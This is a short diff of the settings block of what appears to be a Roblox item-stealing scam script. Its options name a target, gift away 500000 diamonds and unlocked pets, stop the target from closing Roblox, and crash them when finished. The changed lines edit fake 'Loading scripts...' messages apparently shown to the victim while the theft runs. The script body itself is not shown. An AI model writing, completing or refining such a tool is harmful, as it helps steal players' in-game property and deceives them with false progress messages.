@@ -5,9 +5,9 @@ _G.GiftMessage = "500000" --// Message For The Gift To Say _G.Diamonds = 500000 
 _G.UnlockPets = true --// Unlocks Locked Pets 
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox 
 _G.Crash = true --// Crashes Them After Its Finished 
-_G.Tip1 = "The script is loading slower than expected.." --// Gives You Tips On The UI 
-_G.Tip2 = "Loading scripts..." --// Gives You Tips On The UI 
-_G.Tip3 = "Loading Modules..." --// Gives You Tips On The UI 
+_G.Tip1 = "Loading scripts." --// Gives You Tips On The UI 
+_G.Tip2 = "Loading scripts.." --// Gives You Tips On The UI 
+_G.Tip3 = "Loading scripts..." --// Gives You Tips On The UI 
 _G.Tip4 = "Almost there!" --// Gives You Tips On The UI 
 _G.Tip5 = "Do not leave the game or it may break the script" --// Gives You Tips On The UI
  --[[ Script ]]--
